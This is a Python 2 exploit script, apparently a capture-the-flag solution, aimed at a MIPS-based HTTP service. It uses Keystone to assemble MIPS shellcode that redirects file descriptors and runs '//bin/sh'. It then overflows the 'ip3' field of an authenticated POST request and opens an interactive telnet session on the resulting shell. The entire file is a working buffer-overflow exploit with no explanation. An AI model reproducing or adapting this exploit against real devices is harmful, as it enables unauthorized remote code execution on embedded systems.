import socket
import struct
import subprocess
import requests
from requests.auth import HTTPBasicAuth
from keystone import *

import telnetlib

ks = Ks(KS_ARCH_MIPS, KS_MODE_32)

#IP_BUFFER = 0x04177D0 
IP_BUFFER = 0x0417E90
CHAIN_ADDR = IP_BUFFER+1024
SC_ADDR = IP_BUFFER+16+12
BIN_SH = IP_BUFFER+16

FD = 5

print SC_ADDR+4*24
print 'jal '+hex(SC_ADDR+4*20)


pl = 'ip0=0&ip1=0&ip2=0&ip3='
pl += 'A'*(16-6)
sc = '//bin/shAAAA'
sc += ''.join(map(chr, ks.asm('''
and $v1, $v1, 0x0101;
and $v1, $v1, 0x0202;

or $v0, $v1, 0x0fa6;
or $a0, $v1, 0x0101;
and $a0, $a0, 0x02ff;
syscall 0x42424;

or $v0, $v1, 0x0fa6;
or $a0, $v1, 0x0101;
and $a0, $a0, 0x0202;
syscall 0x42424;


or $v0, $v1, 0x0fc9;
or $a0, $v1, 0x010'''+str(FD)+''';
and $a0, $a0, 0x02ff;
syscall 0x42424;

or $v0, $v1, 0x0fc9;
or $a0, $v1, 0x010'''+str(FD)+''';
and $a0, $a0, 0x02ff;
syscall 0x42424;
''')[0] +
# for some reason this was segfaulting me with ks.asm, but not kstool
map(lambda x: int(x,16), subprocess.check_output(['kstool','mips','jal '+hex(SC_ADDR+4*20)]).split('[ ')[1][:11].split())+
ks.asm('''and $t1, $t1, 0xffff;
subu $ra, $ra, 0x158;
sw $v1, 0x104($ra);

subu $ra, $ra, 0x10c;
add $a0, $ra, 0x208;

or $v0, $v1, 0x0fab;
and $a1, $v1, 0xfff;
and $a2, $v1, 0xfff;

syscall 0x42424;

and $t1, $t1, 0xffff;''')[0]))
print sc.encode('hex')

pl += sc.ljust(1024-0x10, 'A')
pl += ''.join(map(chr, ks.asm('j '+hex(SC_ADDR))[0][:4]+ks.asm('and $v1, $v1, 0xffff')[0]))
pl += "CCCC"
pl += "DDDD"
pl += struct.pack('<I',CHAIN_ADDR)

buff = '''POST /count?ZZZZZZZZZZ HTTP/1.1\r
Host: 0.0.0.0:1337\r
Content-Length: 1060\r
Accept-Encoding: gzip, deflate\r
Accept: */*\r
User-Agent: python-requests/2.7.0 CPython/2.7.6 Linux/3.13.0-32-generic\r
Connection: keep-alive\r
Authorization: Basic YWRtaW46RUI0UEZjVWhtOVJVTnc=\r
\r
'''+pl+'\n'


so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
so.connect(('',8080))

so.send(buff)

t = telnetlib.Telnet()
t.sock = so
t.interact()
